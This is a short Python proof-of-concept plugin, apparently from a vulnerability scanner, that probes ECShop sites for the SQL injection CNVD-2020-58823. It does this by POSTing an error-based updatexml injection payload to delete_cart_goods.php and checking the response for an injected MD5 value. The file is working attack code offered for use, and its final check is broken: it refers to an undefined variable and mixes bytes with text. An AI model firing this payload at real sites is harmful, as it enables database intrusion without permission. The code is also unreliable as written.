#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'ecshop sqli CNVD-2020-58823',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomInt(n,m):#返回某个范围中的int
  import random
  return random.randint(n,m)
def hashmd5(s):
  import hashlib
  md5 = hashlib.md5()
  md5.update(str(s).encode('utf-8'))
  str_md5 = md5.hexdigest()
  return str_md5
def substr(s,n,m):#返回字符串s的切片截取
  return s[n:m]
def run(url,ua):
  r1 = randomInt(40000,44800)
  r1_md5 = hashmd5(r1)
  str_sub = substr(r1_md5,0,30)
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/delete_cart_goods.php'
  data = f"id=0||(updatexml(1,concat(0x7e,(select%20md5({r1})),0x7e),1))"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and bytes(str_md5) in res.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret